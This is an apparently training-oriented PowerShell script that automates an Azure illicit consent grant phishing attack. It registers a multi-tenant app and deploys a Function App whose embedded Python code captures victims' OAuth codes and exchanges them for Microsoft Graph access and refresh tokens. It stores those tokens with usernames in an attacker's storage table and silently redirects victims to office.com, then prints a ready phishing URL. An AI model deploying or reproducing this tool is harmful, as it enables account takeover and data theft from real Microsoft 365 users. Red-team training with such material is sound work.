﻿<#
Created by Nagendrra C at Altered Security Pte Ltd.
Copyright (C) Altered Security Pte Ltd. - All rights reserved.

This script is meant for educational purposes only. 
The creator takes no responsibility of any mis-use of this script.
#>

################################################################################################
### Get Random Value
################################################################################################
function Get-RandomValue {
    [CmdletBinding()]
    param (
        #[string]$Prefix = "AS",

        [string]$length = 5
    
    )

    $value = -join ((97..122) | Get-Random -Count $length | ForEach-Object { [char]$_ }) 
    $Time = (Get-Date -UFormat %s).Replace(".", "")
    $tValue = $Time.Substring($Time.Length - 7, 7)

    return $value + $tValue
}



################################################################################################
### Variable Declaration
################################################################################################
$Prefix = 'ac'
$rgname = Get-RandomValue 
$location = "eastus"
$StorageAccountName = Get-RandomValue 
$FunctionAppStorageAccountName = Get-RandomValue 
$TableName = "logs"
$FuncAppAppServicePlanName = Get-RandomValue
$FunctionAppName = Get-RandomValue
$AppRegName = Get-RandomValue
$functionname = 'ICT'
################################################################################################
### Create Resource Group
################################################################################################
New-AzResourceGroup -Name $rgname -Location $location

################################################################################################
### Create Storage Account
################################################################################################
$StorageAccount = New-AzStorageAccount -ResourceGroupName $rgname -Name $StorageAccountName -Location $location -SkuName Standard_ZRS -Kind StorageV2 -ErrorAction SilentlyContinue


################################################################################################
### Create Table
################################################################################################
$StorageAccountTable = New-AzStorageTable -Name $TableName -Context $StorageAccount.Context

################################################################################################
### Fetch the ConnectionString
################################################################################################
$StorageAccountConnectionString = $StorageAccount.Context.ConnectionString


################################################################################################
### Create Storage Account for FunctionApp
################################################################################################
$FunAppStorageAccount = New-AzStorageAccount -ResourceGroupName $rgname -Name $FunctionAppStorageAccountName -Location $location -SkuName Standard_ZRS -Kind StorageV2 -ErrorAction SilentlyContinue

################################################################################################
### Create an Function App that leverages the same App Service Plan
################################################################################################
$FunctionApp = New-AzFunctionApp -ResourceGroupName $rgname -Name $FunctionAppName -StorageAccountName $FunctionAppStorageAccountName -Runtime Python -OSType Linux -RuntimeVersion 3.11 -FunctionsVersion 4 -Location $location


################################################################################################
### Fetch Function App HostName
################################################################################################
$FunctionAppURL = $FunctionApp.DefaultHostName

################################################################################################
### Getting function app master key
################################################################################################
$azureFunction = Get-AzFunctionApp -ResourceGroupName $rgname -Name $FunctionAppName
$keys = Invoke-AzResourceAction -ResourceId $($azureFunction.Id) -Action "host/default/listKeys" -Force
$masterKey = $keys.masterKey

################################################################################################
### Creating App Registration and service principal
################################################################################################
$AppRegDetails =  New-AzADApplication -DisplayName $AppRegName -AvailableToOtherTenants 1 -ReplyUrls "https://$FunctionAppURL/api/$functionname"
New-AzADServicePrincipal -AppId $AppRegDetails.AppId

################################################################################################
### Creating App Registration client secret
################################################################################################
$AppRegCred = New-AzADAppCredential -ObjectId $AppRegDetails.Id

$Clientid = $AppRegDetails.AppId
$ClientSecret = $AppRegCred.SecretText

################################################################################################
### Creating function app function.
################################################################################################
$URL = "https://$FunctionAppName.azurewebsites.net/admin/vfs/home/site/wwwroot/$functionname/__init__.py"

$Params = @{
    "URI"     = $URL
    "Method"  = "PUT"
    "Headers" = @{
    "Content-Type" = "application/octet-stream"
    "x-functions-key" = "$masterKey"
    }
}


$Body = @"
import logging, uuid, subprocess
import azure.functions as func

def import_or_install_module(module_name):
    try:
        # Attempt to import the module
        import_module = __import__(module_name)
    except ImportError:
        # The module is not installed; install it
        subprocess.call(["pip", "install", module_name])

def main(req: func.HttpRequest, context: func.Context) -> func.HttpResponse:
    try:
        logging.info('illicit consent grant attack demo')
        import_or_install_module("msal")
        import_or_install_module("azure.data.tables")
        import msal
        from azure.data.tables import TableServiceClient

        CLIENT_ID = "$Clientid"
        CLIENT_SECRET = "$ClientSecret" 
        Redirect = "https://$FunctionAppURL/api/$functionname"
        AUTHORITY = "https://login.microsoftonline.com/common"
        SCOPE = ["https://graph.microsoft.com/.default"]
        code_val = req.params.get('code')
        # Cache
        cache = msal.SerializableTokenCache()

        # Build msal app
        app = msal.ConfidentialClientApplication(CLIENT_ID, authority=AUTHORITY, client_credential=CLIENT_SECRET, token_cache=cache)

        result = app.acquire_token_by_authorization_code(code=code_val,redirect_uri=Redirect,scopes=SCOPE)

        #logging.INFO(f"{result}")

        connection_string = "$StorageAccountConnectionString"
        service = TableServiceClient.from_connection_string(conn_str=connection_string)
        
        table_client = service.get_table_client(table_name="$TableName")

        access_token = result["access_token"]
        refresh_token = result["refresh_token"]
        username = result["id_token_claims"]["preferred_username"]

        my_entity = {
        u'PartitionKey': str(uuid.uuid4()),
        u'RowKey': str(uuid.uuid4()),
        u'RawData': str(result),
        u'Access_Token': access_token,
        u'Refresh_Token': refresh_token,
        u'UserName':username
        }

        entity = table_client.create_entity(entity=my_entity)
        headers = {"Location": "https://www.office.com"}
        return func.HttpResponse(headers=headers, status_code=302)

    except Exception as e:
            headers = {"Location": "https://www.office.com"}
            return func.HttpResponse(headers=headers, status_code=302)

"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body

################################################################################################
### Adding function json
################################################################################################
$URL = "https://$FunctionAppName.azurewebsites.net/admin/vfs/home/site/wwwroot/$functionname/function.json"

$Params = @{
    "URI"     = $URL
    "Method"  = "PUT"
    "Headers" = @{
    "Content-Type" = "application/octet-stream"
    "x-functions-key" = "$masterKey"
    }
}

$Body = @"
{
  "bindings": [
    {
      "authLevel": "anonymous",
      "type": "httpTrigger",
      "direction": "in",
      "name": "req",
      "methods": [
        "get",
        "post"
      ]
    },
    {
      "type": "http",
      "direction": "out",
      "name": "`$return"
    }
  ]
}
"@

Invoke-RestMethod @Params -UseBasicParsing -Body $Body

################################################################################################
### Output
################################################################################################

$finalURL = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$Clientid&scope=https://graph.microsoft.com/.default%20openid%20offline_access&redirect_uri=https://$FunctionAppURL/api/$functionname&response_mode=query"
Write-Output '################################################################################################'
Write-Output "Phishing URL" 
Write-Output "################################################################################################"
Write-Output $finalURL

Write-Output '################################################################################################'
Write-Output "Storage account Connection string"
Write-Output '################################################################################################'
Write-Output $StorageAccountConnectionString

Write-Output '################################################################################################'
Write-Output "App Registration Name (Change the API permission as per your requirement)"
Write-Output '################################################################################################'
Write-Output $AppRegName